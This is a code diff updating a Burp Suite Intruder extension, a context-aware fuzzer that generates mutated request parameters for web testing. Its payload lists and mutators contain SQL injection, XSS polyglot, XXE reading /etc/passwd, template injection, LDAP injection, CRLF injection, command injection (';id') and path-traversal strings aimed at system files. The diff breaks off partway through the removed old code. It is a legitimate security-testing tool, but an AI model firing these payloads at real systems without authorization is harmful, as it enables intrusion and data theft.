@@ -11,22 +11,26 @@
 # to previously detected encoding scheme. 
 #
 # Requirements for Jython (to be installed in Jython's environment):
-#	- Jython 2.7.1b3+
-#	- anytree
-#	- jwt
+#   - Jython 2.7.1b3+
+#   - anytree
+#   - jwt
+#   - lxml
+#   - flatten_json
 #
 # On Windows it may be a bit tricky to resolve Jython's requirements. The steps that worked
 # for author of this script are:
-#	-----------------------------------------------------------------------------
-#	cmd> java -cp jython.jar org.python.util.jython -m ensurepip
-#	cmd> java -cp jython.jar org.python.util.jython
-#	Jython 2.7.1b3 (default:df42d5d6be04, Feb 3 2016, 03:22:46)
-#	[Java HotSpot(TM) 64-Bit Server VM (Oracle Corporation)] on  java1.8.0_144
-#	Type "help", "copyright", "credits" or "license" for more information.
-#	>>> import pip
-#	>>> pip.main(['install', 'anytree'])
-#	>>> pip.main(['install', 'pyjwt'])
-#	-----------------------------------------------------------------------------
+#   -----------------------------------------------------------------------------
+#   cmd> java -cp jython.jar org.python.util.jython -m ensurepip
+#   cmd> java -cp jython.jar org.python.util.jython
+#   Jython 2.7.1b3 (default:df42d5d6be04, Feb 3 2016, 03:22:46)
+#   [Java HotSpot(TM) 64-Bit Server VM (Oracle Corporation)] on  java1.8.0_144
+#   Type "help", "copyright", "credits" or "license" for more information.
+#   >>> import pip
+#   >>> pip.main(['install', 'anytree'])
+#   >>> pip.main(['install', 'pyjwt'])
+#   >>> pip.main(['install', 'lxml'])
+#   >>> pip.main(['install', 'flatten_json'])
+#   -----------------------------------------------------------------------------
 #
 # Mariusz B., 2018
 #
@@ -42,15 +46,22 @@ import sys
 import jwt
 import math
 import json
+import zlib
 import string
 import base64
 import urllib
 import random
 import anytree
 import binascii
-from collections import Counter
+import flatten_json
+import xml.dom.minidom
+import xml.etree.ElementTree as ET
 
-VERSION = '0.1-alpha'
+from lxml import etree
+from collections import Counter
+from collections import OrderedDict
+
+VERSION = '0.2-alpha'
 
 # This pattern will be appended to generated test cases in order to 
 # be looked upon when reviewing responses.
@@ -62,177 +73,280 @@ UNIQUE_PATTERN_TO_SEARCH_FOR = 'FUZZFUZZ'
 # AND OTHER TEST-CASE PATTERNS
 #
 
-QUICK_FUZZ_LIST = (
-	"'",
-	'"',
-	"''",
-	'""',
-	"'\"'",
-	"\"''''\"'\"", 
-	"\"", 
-	"\"\"", 
-	"``", 
-	"\\'", 
-	"\\\"", 
-	"&", 
-	"|", 
-	"}", 
-	"\\\\", 
-	"\\\\/", 
-	"' or ''='", 
-	" or 0=0 #\"",
-	"' or 0=0 --", 
-	"' or 0=0 #", 
-	"\" or 0=0 --", 
-	"or 0=0 --", 
-	"or 0=0 #", 
-	"' or 1 --'", 
-	"' or 1/*", 
-	"; or '1'='1'",
-	"' or '1'='1", 
-	"' or '1'='1'--", 
-	"' or 1=1", 
-	"' or 1=1 /*", 
-	"' or 1=1--", 
-	"'/**/or/**/1/**/=/**/1", 
-	"\" or 1=1--",
-	"or 1=1", 
-	"or 1=1--", 
-	" or 1=1 or \"\"=", 
-	"' or 1=1 or ''='", 
-	"%0D%0A%0D%0A", 
-	"*", 
-	"*/*", 
-	"/", 
-	"//", 
-	"//*", 
-	":", 
-	";", 
-	"@", 
-	"@*", 
-	"(", 
-	")", 
-	"\\", 
-	"?*", 
-	"%20",
-	"%00", 
-	' --help',
-	' --version',
+# This list will be appended to various test-cases
+FUZZ_APPEND_LIST = (
+    "'",
+    '"',
+    "`", 
+    "~", 
+
+    "'\"'",
+    "\"''''\"'\"", 
+    "\"", 
+    "\\'", 
+    "\\\"", 
+
+    "/", 
+    "/\\", 
+    "//", 
+    "//\\", 
+    "\\", 
+    "\\/", 
+    "\\\\", 
+    "\\\\/", 
+
+    "&", 
+    "|", 
+    "}",  
+    "*", 
+    "*/*", 
+    "//*", 
+
+    ":", 
+    ";",
+
+    "@", 
+    "@*", 
+    "(", 
+    ")", 
+    "?*", 
+    
+    "%00", 
+    "%0D%0A%0D%0A", 
+    
+    ' --help',
+    ' --version',
+
+    " or 1=1",
+    " or 1=1 --",
+    " or 1=1 #",
+    "' or 1=1 --",
+    "\" or 1=1 --",
+    "' or 1=1 #",
+    "\" or 1=1 #",
+    "' or '1'='1",
+    "' or '1'='1'--",
+    "' or '1'='1'#",
+    "\" or \"1\"=\"1",
+    "\" or \"1\"=\"1\"--",
+    "\" or \"1\"=\"1\"#",
 )
 
-QUICK_FUZZ_INSERT_LIST = (
-	"0", 
-	"1", 
-	"1.0", 
-	"2",
-	"2147483647", 
-	"268435455", 
-	"65536", 
-	"-1", 
-	"-1.0", 
-	"-2", 
-	"-2147483647", 
-	"-268435455", 
-	"-65536",
+# This list will fill up tested parameter and thus constitute a test-case
+FUZZ_INSERT_LIST = (
+    "0", 
+    "1", 
+    "1.0", 
+    "2",
+    "2147483647", 
+    "268435455", 
+    "65536", 
 
-	"*()|%26'", 
-	"*()|&'", 
-	"*(|(mail=*))", 
-	"*(|(objectclass=*))",
-	"*)(uid=*))(|(uid=*", 
-	"(*)*)", 
-	"*)*", 
-	"*/*", 
-	"*|", 
-	"@*", 
-	"%70", 
-	".%E2%73%70", 
-	"%2e0", 
-	"%2e", 
-	".", 
+    "-1", 
+    "-1.0", 
+    "-2", 
+    "-2147483647", 
+    "-268435455", 
+    "-65536",
 
-	"%2f", 
-	"%5c", 
-	"..",
-	'undefined',
-	'undef',
-	'null',
-	'NULL',
-	'(null)',
-	'nil',
-	'NIL',
-	'true',
-	'false',
-	'True',
-	'False',
-	'TRUE',
-	'FALSE',
-	'None',
-	'hasOwnProperty',
-	'\\',
+    "*()|%26'", 
+    "*()|&'", 
+    "*(|(mail=*))", 
+    "*)(uid=*))(|(uid=*", 
+    "(*)*)", 
+    "*)*", 
+    "*/*", 
+    "*|", 
+    "@*", 
+    "%70", 
+    ".%E2%73%70", 
+    "%2e", 
+    ".", 
+    "..", 
 
-	"count(/child::node())", 
-	"false", 
-	"null", 
-	"true", 
-	"{}", 
-	'{"1":"0"}',
-	'{"1":0}', 
-	'{"0":"\\x00"}', 
-	'{"0":[]}', 
-	'{"0":[1]}', 
-	'{"0":[1,2]}', 
-	'{"0":["1","2"]}', 
-	'{"\\x00":"0"}', 
-	'{"\\x00":0}',
-	'{"\\x00":""}', 
-	'{"\\x00":[]}', 
-	'{"\\x00":[1]}', 
-	'{"\\x00":[1,2]}', 
+    # Other ones coming from SecLists metacharacters
+    "!'",
+    "!@#$%%^#$%#$@#$%$$@#$%^^**(()",
+    "!@#0%^#0##018387@#0^^**(()",
+    "\"><script>\"",
+    "\">xxx<P>yyy",
+    "\"\t\"",
+    "#",
+    "#&apos;",
+    "#'",
+    "#xA",
+    "#xA#xD",
+    "#xD",
+    "#xD#xA",
+    "$NULL",
+    "$null",
+    "%",
+    "%00",
+    "%00/",
+    "%01%02%03%04%0a%0d%0aADSF",
+    "%0a",
+    "%20",
+    "%20|",
+    "%2500",
+    "%250a",
+    "%2A",
+    "%2C",
+    "%2e%2e%2f",
+    "%3C%3F",
+    "%5C",
+    "%5C/",
+    "%60",
+    "%7C",
+    "&#10;",
+    "&#10;&#13;",
+    "&#13;",
+    "&#13;&#10;",
+    "&apos;",
+    "&quot;;id&quot;",
+    "(')",
+    "*",
+    "*&apos;",
+    "*'",
+    "*|",
+    "+%00",
+    "-",
+    "--",
+    "..%%35%63",
+    "..%%35c",
+    "..%25%35%63",
+    "..%255c",
+    "..%5c",
+    "..%bg%qf",
+    "..%c0%af",
+    "..%u2215",
+    "..%u2216",
+    "../",
+    "..\\",
+    "/",
+    "/%00/",
+    "/%2A",
+    "/&apos;",
+    "/'",
+    "00",
+    "0xfffffff",
+    ";",
+    "<?",
+    "?x=",
+    "?x=\"",
+    "?x=>",
+    "?x=|",
+    "@&apos;",
+    "@'",
+    "A",
+    "ABCD|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|",
+    "FALSE",
+    "NULL",
+    "TRUE",
+    "[&apos;]",
+    "[']",
+    "\"blah",
+    "\&apos;",
+    "\\'",
+    "\\0",
+    "\\00",
+    "\\00\\00",
+    "\\00\\00\\00",
+    "\\0\\0",
+    "\\0\\0\\0",
+    "\\\\*",
+    "\\\\?\\",
+    "\t",
+    "^&apos;",
+    "^'",
+    "id%00",
+    "id%00|",
+    "{&apos;}",
+    "{'}",
+    "|",
+    "}\"",
 
-	# Server side template injection #1
-	"${666666*1}",
-	"{{666666*1}}",
-	"{{666666*'1'}}",
-	"${666666*1}a{{666666}}b",
+    'undefined',
+    'undef',
+    'null',
+    'NULL',
+    '(null)',
+    'nil',
+    'NIL',
+    'true',
+    'false',
+    'True',
+    'False',
+    'TRUE',
+    'FALSE',
+    'None',
+    'hasOwnProperty',
 
-	# Smarty Template: FUZZFUZZ{*comment*}FUZZFUZZ
-	UNIQUE_PATTERN_TO_SEARCH_FOR + "{*comment*}" + UNIQUE_PATTERN_TO_SEARCH_FOR,
+    "count(/child::node())", 
+    "{}", 
+    '{"1":"0"}',
+    '{"1":0}', 
+    '{"0":"\\x00"}', 
+    '{"0":[]}', 
+    '{"0":[1]}', 
+    '{"0":[1,2]}', 
+    '{"0":["1","2"]}', 
+    '{"\\x00":"0"}', 
+    '{"\\x00":0}',
+    '{"\\x00":""}', 
+    '{"\\x00":[]}', 
+    '{"\\x00":[1]}', 
+    '{"\\x00":[1,2]}', 
 
-	# Mako templates: ${"FUZZFUZZ".join("FUZZFUZZ")}
-	'${"' + UNIQUE_PATTERN_TO_SEARCH_FOR + '".join("' + UNIQUE_PATTERN_TO_SEARCH_FOR + '"}}',
+    # Server side template injection #1
+    "${666666*1}",
+    "{666666*1}",
 
-	"'\"><img src=x onerror=alert(/666/)>",
-	'<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>',
-	"';alert(0)//\\';alert(1)//\";alert(2)//\\\";alert(3)//--></SCRIPT>\">'><SCRIPT>alert(4)</SCRIPT>=&{}\");}alert(6);function xss(){//",
-	"jaVasCript:/*-/*`/*\`/*'/*\"/**/(/* */oNcliCk=alert(666666) )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(667667)//>\\x3e",
+    # Twig
+    "{{666666*1}}",
+    "{{ '" + UNIQUE_PATTERN_TO_SEARCH_FOR + "'|upper }}",
 
-	"\x0d\x0aCC: example@gmail.com\x0d\x0aLocation: www.google.com",
-	"||cmd.exe&&id||",
+    "{{666666*'1'}}",
+    "${666666*1}a{{666666}}b",
+
+    # Smarty Template: FUZZFUZZ{*comment*}FUZZFUZZ
+    UNIQUE_PATTERN_TO_SEARCH_FOR + "{*comment*}" + UNIQUE_PATTERN_TO_SEARCH_FOR,
+
+    # Mako templates: ${"FUZZFUZZ".join("FUZZFUZZ")}
+    '${"' + UNIQUE_PATTERN_TO_SEARCH_FOR + '".join("' + UNIQUE_PATTERN_TO_SEARCH_FOR + '"}}',
+
+    "'\"><img src=x onerror=alert(/666/)>",
+    '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>',
+    "';alert(0)//\\';alert(1)//\";alert(2)//\\\";alert(3)//--></SCRIPT>\">'><SCRIPT>alert(4)</SCRIPT>=&{}\");}alert(6);function xss(){//",
+    "jaVasCript:/*-/*`/*\`/*'/*\"/**/(/* */oNcliCk=alert(666666) )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(667667)//>\\x3e",
+
+    "\x0d\x0aCC: example@gmail.com\x0d\x0aLocation: www.google.com",
+    "||cmd.exe&&id||",
+    "||id||",
+    ";id",
 )
 
 PATH_TRAVERSAL_FILES = {
-	'linux': (
-		r'.htpasswd',
-		r'/etc/passwd',
-		r'/proc/self/environ',
-		r'/etc/crontab',
-		r'/etc/fstab',
-		r'/etc/group',
-		r'/etc/hostname',
-		r'/etc/hosts',
-		r'/var/log/dmesg',
-		r'/var/log/auth',
-		r'/etc/issue',
-		r'/etc/resolv.conf',
-	),
+    'linux': (
+        r'.htpasswd',
+        r'/etc/passwd',
+        r'/proc/self/environ',
+        #r'/etc/crontab',
+        r'/etc/fstab',
+        r'/etc/group',
+        r'/etc/hostname',
+        r'/etc/hosts',
+        #r'/var/log/dmesg',
+        #r'/var/log/auth',
+        r'/etc/issue',
+        #r'/etc/resolv.conf',
+    ),
 
-	'windows' : (
-		r'\Windows\win.ini',
-		r'\boot.ini',
-		r'\winnt\win.ini',
-		r'\inetpub\wwwroot\index.asp',
-	)
+    'windows' : (
+        r'\Windows\win.ini',
+        r'\boot.ini',
+        r'\winnt\win.ini',
+        r'\inetpub\wwwroot\index.asp',
+    )
 }
 
 
@@ -241,10 +355,27 @@ PATH_TRAVERSAL_FILES = {
 # RE-ENCODER'S IMPLEMENTATION
 #
 
+
 class ReEncoder:
 
     # Switch this to show some verbose informations about decoding process.
     DEBUG = False
+
+    class Utils:
+        @staticmethod
+        def isBinaryData(data):
+            nonBinary = 0
+            percOfBinaryToAssume = 0.10
+
+            for d in data:
+                c = ord(d)
+                if c in (10, 13): 
+                    nonBinary += 1
+                elif c >= 0x20 and c <= 0x7f:
+                    nonBinary += 1
+
+            binary = len(data) - nonBinary
+            return binary >= int(percOfBinaryToAssume * len(data))
 
     # ============================================================
     # ENCODERS SECTION
@@ -286,7 +417,7 @@ class ReEncoder:
             if urllib.quote(urllib.unquote(data)) == data and (urllib.unquote(data) != data):
                 return True
 
-            if re.match(r'^(?:%[0-9a-f]{2})+$', data, re.I):
+            if re.search(r'(?:%[0-9a-f]{2})+', data, re.I):
                 return True
 
             return False
@@ -349,24 +480,27 @@ class ReEncoder:
         def decode(self, data):
             return base64.urlsafe_b64decode(data)
 
-    class JWTEncoder(Encoder):
-        secret = ''
-
+    class ZlibEncoder(Encoder):
         def name(self):
-            return 'JWT'
+            return 'ZLIB'
 
         def check(self, data):
-            try:
-                jwt.decode(data, verify = False)
-                return True
-            except jwt.exceptions.DecodeError:
+            if not ReEncoder.Utils.isBinaryData(data):
                 return False
+
+            try:
+                if zlib.compress(zlib.decompress(data)) == data:
+                    return True
+            except:
+                pass
+            return False
             
         def encode(self, data):
-            return jwt.encode(data, JWTEncoder.secret)
+            return zlib.compress(data)
 
         def decode(self, data):
-            return jwt.decode(data, verify = False)
+            return zlib.decompress(data)
+
 
 
     # ============================================================
@@ -382,7 +516,7 @@ class ReEncoder:
             ReEncoder.HexEncoder(),
             ReEncoder.Base64Encoder(),
             ReEncoder.Base64URLSafeEncoder(),
-            ReEncoder.JWTEncoder(),
+            ReEncoder.ZlibEncoder(),
 
             # None must always be the last detector
             ReEncoder.NoneEncoder(),
@@ -522,7 +656,7 @@ class ReEncoder:
             ReEncoder.log('\tAdding {} points for printable characters.'.format(printablePoints))
             points += printablePoints
 
-            # Step before-2-and-3: If encoder is Base64 and was previously None
+            # Step 4: If encoder is Base64 and was previously None
             #    - then length and entropy of previous values should be of slighly lower weights
             if name.lower() == 'none' \
                 and len(candidates) > i+1 \
@@ -563,6 +697,9 @@ class ReEncoder:
 
         return encodings
 
+    def getWinningDecodePath(self, root):
+        return [x for x in self.evaluateEncodingTree(root) if x != 'None']
+
     def process(self, data):
         root = anytree.Node('None', decoded = data)
         prev = root
@@ -579,9 +716,10 @@ class ReEncoder:
                 prev = currNode
 
         for pre, fill, node in anytree.RenderTree(root):
-            ReEncoder.log("%s%s (%s)" % (pre, node.name, node.decoded[:20].decode('ascii', 'ignore')))
+            if node.name != 'None':
+                ReEncoder.log("%s%s (%s)" % (pre, node.name, node.decoded[:20].decode('ascii', 'ignore')))
 
-        self.encodings = self.evaluateEncodingTree(root)
+        self.encodings = self.getWinningDecodePath(root)
         ReEncoder.log('[+] Selected encodings: {}'.format(str(self.encodings)))
 
     def decode(self, data, encodings = []):
@@ -609,266 +747,397 @@ class ReEncoder:
 
         return data
 
+class BaseFuzzer:
+    def name(self):
+        raise NotImplementedError
+
+    def check(self, data):
+        raise NotImplementedError
+
+    def getMutations(self, data):
+        raise NotImplementedError
+
+    def reset(self):
+        raise NotImplementedError
+
+class BasicTypeFuzzer(BaseFuzzer):
+    def __init__(self):
+        self.mutations = []
+
+    def reset(self):
+        self.mutations = []
+
+    def name(self):
+        return 'BasicType'
+
+    def findType(self, data):
+        try:
+            val = int(data)
+            return 'integer'
+        except ValueError:
+            pass
+
+        try:
+            val = float(data)
+            return 'float'
+        except ValueError:
+            pass
+
+        printable = sum([int(x in string.printable) for x in data]) == len(data)
+        if printable:
+            forbidden = ('<', '>', ':', '"', '|', '?', '*')
+            for f in forbidden:
+                if f in data:
+                    return 'string'
+
+            if data.count('/') <= 1 and data.count('\\') <= 1: 
+                return 'string'
+
+            try:
+                if base64.b64encode(base64.b64decode(data)) == data:
+                    # This happens to be valid base64
+                    return 'string'
+            except:
+                pass
+
+            regexes = (
+                # Windows path
+                r'^(?:[a-zA-Z]:)?\\?[\\\S|*\S]?.*$',
+
+                # Linux path
+                r'^(\/?[^\/]*)+',
+            )
+
+            for r in regexes:
+                if re.match(r, data, re.I):
+                    return 'path'
+
+            return 'string'
+        else:
+            return ''
+
+    def check(self, data):
+        return self.findType(data) != ''
+
+    def stringMutator(self, payload):
+        offset = random.randint(0, len(payload) - 1)
+        mutated0 = payload[:offset]
+        mutated1 = payload[offset:]
+
+        # Mutations #4: Add some repeated values
+        for i in range(3):
+            try:
+                chunkLen = random.randint(len(payload[offset:]), len(payload) - 1)
+            except ValueError:
+                chunkLen = len(payload) - offset
+            repeater = random.randint(1, 10)
+
+            repeated = mutated0
+            for i in range(repeater):
+                repeated += payload[offset : offset + chunkLen]
+
+            self.mutations.append(repeated + mutated1)
+
+        # Mutations #5: Some random bit flips
+        for i in range(3):
+            byte = random.randint(0, len(payload) - 1)
+            bit = random.randint(0, 7)
+
+            mutatedByte = '%{:02x}'.format( (ord(payload[byte]) ^ (1 << bit)) % 255 )
+            mutated = payload[:byte - 1] + mutatedByte + payload[byte + 1:]
+            self.mutations.append(mutated)
+
+        # Mutations #6: Add those cut in half pieces
+        self.mutations.append(mutated0)
+        self.mutations.append(mutated1)
+
+        return list(set(self.mutations))
+
+    def genericMutations(self, payload):
+        offset = random.randint(0, len(payload) - 1)
+        mutated0 = payload[:offset]
+        mutated1 = payload[offset:]
+
+        mutations = []
+
+        # Mutation #1: Empty string
+        mutations.append('')
+
+        # Mutations #2a: Some predefined entries in place of previous value
+        for i in FUZZ_APPEND_LIST:
+            mutations.append(
+                payload + i + UNIQUE_PATTERN_TO_SEARCH_FOR
+            )
+
+        # Mutations #2b: Add some insert-only values
+        for i in FUZZ_INSERT_LIST:
+            mutations.append(i)
+
+        # Mutations #3: Some predefined entries inside of a payload
+        for i in FUZZ_APPEND_LIST:
+            mutations.append(
+                mutated0 + i + mutated1 + UNIQUE_PATTERN_TO_SEARCH_FOR
+            )
+
+        self.mutations = mutations
+        return mutations
+
+    def integerMutator(self, data):
+        values = [
+            2 ** 0, 2 ** 1, 2 ** 8 - 1, 2 ** 8, 1000, 2 ** 16 - 1, 2 ** 16, 2 ** 32 - 1, 2 ** 32
+        ]
+
+        edgeCases = values + [-x for x in values]
+        return [str(x) for x in edgeCases]
+
+    def floatMutator(self, data):
+        values = [
+            2 ** 0, 2 ** 1, 2 ** 8 - 1, 2 ** 8, 1000, 2 ** 16 - 1, 2 ** 16, 2 ** 32 - 1, 2 ** 32
+        ]
+
+        # normalized, denormalized, edge, and other values
+        ieee754trickery = [
+            0.0000000000000000000000000000000000000000000014013,
+            100000017085266530000000000000000000000.0,
+            1.99999988079071044921875,
+            170141183460469231731687303715884105728,
+            5.878951525289764546670578144551182540527959740471059208198733995499873916656952133052982389926910400390625E-39,
+            1.175494210692441075487029444849287348827052428745893333857174530571588870475618904265502351336181163787841796875E-38,
+            2.2250738585072011e-308
+        ]
+
+        edgeCases = []
+
+        for vals in [values, ieee754trickery]:
+            edgeCases.extend([float(x) for x in vals] + [float(-x) for x in vals])
+
+        out = [str(x) for x in edgeCases]
+        out.extend([
+            'Inf', 
+            'Infinity', 
+            'NaN', 
+            '0..0',
+            '.',
+            '0.0.0',
+            '0,00',
+            '0,,0',
+            '1#INF',
+            '1#IND',
+        ])
+
+        return out
+
+    def pathMutator(self, data):
+        # Number of mutations to generate:
+        #   num = 2 * len(files) * len(dotTemplates) * depth
+        depth = 5
+        dotTemplates = {
+            'linux': (
+                '../', '..%2f', '%2e%2e%2f', '..%252f', '..%c0%af../'
+            ), 
+            'windows': (
+                '..\\', '..%5c', '%2e%2e%5c', '..%255c', '..%c0%af..\\'
+            )
+        }
+
+        slashes = {
+            'linux' : '/',
+            'windows' : '\\',
+        }
+
+        for os in ['linux', 'windows']:
+            slash = slashes[os]
+            dots = dotTemplates[os]
+            files = PATH_TRAVERSAL_FILES[os]
+
+            for file in files:
+                for dot in dots:
+                    for i in range(depth):
+                        path = dot * i + slash + file
+                        self.mutations.append(path)
+                        self.mutations.append(slash + path)
+
+    def getMutations(self, data):
+        self.genericMutations(data)
+
+        varType = self.findType(data)
+
+        if varType == 'string':
+            print('[>] Parameter classified as BasicType "string"')
+            self.stringMutator(data)
+
+        elif varType == 'integer':
+            print('[>] Parameter classified as BasicType "integer"')
+            self.integerMutator(data)
+
+        elif varType == 'path':
+            print('[>] Parameter classified as BasicType "path"')
+            self.pathMutator(data)
+
+        mutations = self.mutations[:]
+        ordered = OrderedDict()
+        for mut in self.mutations:
+            ordered[mut] = True
+
+        self.mutations = ordered.keys()
+        return self.mutations
+
+class JSONTypeFuzzer(BaseFuzzer):
+    def name(self):
+        return 'JSON'
+
+    def reset(self):
+        pass
+
+    def check(self, data):
+        try:
+            json.loads(data)
+            return True
+        except ValueError:
+            return False
+
+    def getMutations(self, data):
+        validJson = json.loads(data)
+        mutations = []
+        fuzzer = BasicTypeFuzzer()
+
+        for k, fuzzable in flatten_json.flatten(validJson).items():
+            for mut in fuzzer.getMutations(fuzzable):
+                if data.count(fuzzable) == 1:
+                    dataMutated = data.replace(fuzzable, mut)
+                    mutations.append(dataMutated)
+
+                elif data.count('"' + fuzzable + '"') == 1:
+                    dataMutated = data.replace('"' + fuzzable + '"', '"' + mut + '"')
+                    mutations.append(dataMutated)
+
+                elif data.count(fuzzable + ',') == 1:
+                    dataMutated = data.replace(fuzzable + ',', mut + ',')
+                    mutations.append(dataMutated)
+
+        out = OrderedDict()
+        for mut in mutations:
+            out[mut] = True
+
+        return out.keys()
+
+class XMLTypeFuzzer(BaseFuzzer):
+    def name(self):
+        return 'XML'
+
+    def reset(self):
+        pass
+
+    def check(self, data):
+        try:
+            root = ET.fromstring(data.strip())
+            return True
+        except ValueError:
+            return False
+
+    def iterateNodesAndAttribs(self, root):
+        for elem in root.iter():
+            if elem.text and len(elem.text.strip()) > 0:
+                yield elem.text.strip()
+            for attrName, attrValue in elem.attrib.items():
+                yield attrValue.strip()
+
+    @staticmethod
+    def etree_iter_path(node, tag=None, path='.'):
+        if tag == "*":
+            tag = None
+        if tag is None or node.tag == tag:
+            yield node, path
+        for child in node:
+            _child_path = '%s/%s' % (path, child.tag)
+            for child, child_path in XMLTypeFuzzer.etree_iter_path(child, tag, path=_child_path):
+                yield child, child_path
+
+    @staticmethod
+    def encode(root):
+        outxml = ET.tostring(root)
+        parser = etree.XMLParser(remove_blank_text = True)
+        elem = etree.XML(outxml, parser=parser)
+        return etree.tostring(elem)
+
+    def getMutations(self, data):
+        root = ET.fromstring(data.strip())
+        mutations = []
+        fuzzer = BasicTypeFuzzer()
+
+        out = OrderedDict()
+        for mut in mutations:
+            out[mut] = True
+
+        for elem, path in XMLTypeFuzzer.etree_iter_path(root):
+            elemText = elem.text
+            path = path.replace('./', './/')
+
+            if not elemText: continue
+
+            for attrName, attrValue in elem.attrib.items():
+                attribMutations = fuzzer.getMutations(attrValue) 
+                for mut in attribMutations:
+                    if data.count(attrValue) == 1:
+                        dataMutated = data.replace(attrValue, mut)
+                        mutations.append(dataMutated)
+
+                    elif data.count('"' + attrValue + '"') == 1:
+                        dataMutated = data.replace('"' + attrValue + '"', '"' + mut + '"')
+                        mutations.append(dataMutated)
+
+            elemTextMutations = fuzzer.getMutations(elemText)
+            for mut in elemTextMutations:
+                if data.count(elemText) == 1:
+                    dataMutated = data.replace(elemText, mut)
+                    mutations.append(dataMutated)
+
+                elif data.count('"' + elemText + '"') == 1:
+                    dataMutated = data.replace('"' + elemText + '"', '"' + mut + '"')
+                    mutations.append(dataMutated)
+
+                elif data.count('>' + elemText + '<') == 1:
+                    dataMutated = data.replace('>' + elemText + '<', '>' + mut + '<')
+                    mutations.append(dataMutated)
+
+                else:
+                    elem.text = mut
+                    mutations.append(XMLTypeFuzzer.encode(root))
+                    elem.text = elemText
+
+        return mutations
+
 
 # =============================================
 # BURP EXTENDER INTERFACE IMPLEMENTATION
 #
 
 class BurpExtender(IBurpExtender, IIntruderPayloadGeneratorFactory):
-	def registerExtenderCallbacks(self, callbacks):
-		self._callbacks = callbacks
-		self._helpers = callbacks.getHelpers()
+    def registerExtenderCallbacks(self, callbacks):
+        self._callbacks = callbacks
+        self._helpers = callbacks.getHelpers()
 
-		print('''
-	Context-Aware Payload Fuzzer
-	Mariusz B. / mgeeky, v{}.
+        print('''
+    Context-Aware Payload Fuzzer
+    Mariusz B. / mgeeky, v{}.
 
 [+] For more informations about this extension - please visit:
-	https://github.com/mgeeky/burpContextAwareFuzzer
+    https://github.com/mgeeky/burpContextAwareFuzzer
 
 [+] Unique pattern applied to input-values, to look for in responses:
-	"{}"
+    "{}"
 '''.format(
-		VERSION, UNIQUE_PATTERN_TO_SEARCH_FOR
-	))
+        VERSION, UNIQUE_PATTERN_TO_SEARCH_FOR
+    ))
 
-		callbacks.registerIntruderPayloadGeneratorFactory(self)
+        callbacks.registerIntruderPayloadGeneratorFactory(self)
 
-	def getGeneratorName(self):
-		return 'Context-Aware Payload Fuzzer'
+    def getGeneratorName(self):
+        return 'Context-Aware Payload Fuzzer'
 
-	def createNewInstance(self, attack):
-		return ContextAwareFuzzer(self, attack)
+    def createNewInstance(self, attack):
+        return ContextAwareFuzzer(self, attack)
 
-
-# =============================================
-# TYPE DETECTORS AND FUZZERS
-#
-
-class BaseFuzzer:
-	def name(self):
-		raise NotImplementedError
-
-	def check(self, data):
-		raise NotImplementedError
-
-	def getMutations(self, data):
-		raise NotImplementedError
-
-	def reset(self):
-		raise NotImplementedError
-
-class BasicTypeFuzzer(BaseFuzzer):
-	def __init__(self):
-		self.mutations = []
-
-	def reset(self):
-		self.mutations = []
-
-	def name(self):
-		return 'BasicType'
-
-	def findType(self, data):
-		try:
-			val = int(data)
-			return 'integer'
-		except ValueError:
-			pass
-
-		try:
-			val = float(data)
-			return 'float'
-		except ValueError:
-			pass
-
-		printable = sum([int(x in string.printable) for x in data]) == len(data)
-		if printable:
-			if '/' in data or '\\' in data:
-				return 'path'
-			return 'string'
-		else:
-			return ''
-
-	def check(self, data):
-		return self.findType(data) != ''
-
-	def stringMutator(self, payload):
-		offset = random.randint(0, len(payload) - 1)
-		mutated0 = payload[:offset]
-		mutated1 = payload[offset:]
-
-		# Mutations #4: Add some repeated values
-		for i in range(3):
-			try:
-				chunkLen = random.randint(len(payload[offset:]), len(payload) - 1)
-			except ValueError:
-				chunkLen = len(payload) - offset
-			repeater = random.randint(1, 10)
-
-			repeated = mutated0
-			for i in range(repeater):
-				repeated += payload[offset : offset + chunkLen]
-
-			self.mutations.append(repeated + mutated1)
-
-		# Mutations #5: Some random bit flips
-		for i in range(10):
-			byte = random.randint(0, len(payload) - 1)
-			bit = random.randint(0, 7)
-
-			mutatedByte = '%{:02x}'.format( (ord(payload[byte]) ^ (1 << bit)) % 255 )
-			mutated = payload[:byte - 1] + mutatedByte + payload[byte + 1:]
-			self.mutations.append(mutated)
-
-		# Mutations #6: Add those cut in half pieces
-		self.mutations.append(mutated0)
-		self.mutations.append(mutated1)
-
-		return list(set(self.mutations))
-
-	def genericMutations(self, payload):
-		offset = random.randint(0, len(payload) - 1)
-		mutated0 = payload[:offset]
-		mutated1 = payload[offset:]
-
-		mutations = []
-
-		# Mutation #1: Empty string
-		mutations.append('')
-
-		# Mutations #2: Some predefined entries in place of previous value
-		for i in QUICK_FUZZ_LIST:
-			mutations.append(
-				payload + i + UNIQUE_PATTERN_TO_SEARCH_FOR
-			)
-
-		for i in QUICK_FUZZ_INSERT_LIST:
-			mutations.append(i)
-
-		# Mutations #3: Some predefined entries inside of a payload
-		for i in QUICK_FUZZ_LIST:
-			mutations.append(
-				mutated0 + i + mutated1 + UNIQUE_PATTERN_TO_SEARCH_FOR
-			)
-
-		self.mutations = mutations
-		return mutations
-
-	def integerMutator(self, data):
-		values = [
-			2 ** 0, 2 ** 1, 2 ** 8 - 1, 2 ** 8, 1000, 2 ** 16 - 1, 2 ** 16, 2 ** 32 - 1, 2 ** 32
-		]
-
-		edgeCases = values + [-x for x in values]
-
-		return [str(x) for x in edgeCases]
-
-	def floatMutator(self, data):
-		values = [
-			2 ** 0, 2 ** 1, 2 ** 8 - 1, 2 ** 8, 1000, 2 ** 16 - 1, 2 ** 16, 2 ** 32 - 1, 2 ** 32
-		]
-
-		# normalized, denormalized, edge, and other values
-		ieee754trickery = [
-			0.0000000000000000000000000000000000000000000014013,
-			100000017085266530000000000000000000000.0,
-			1.99999988079071044921875,
-			170141183460469231731687303715884105728,
-			5.878951525289764546670578144551182540527959740471059208198733995499873916656952133052982389926910400390625E-39,
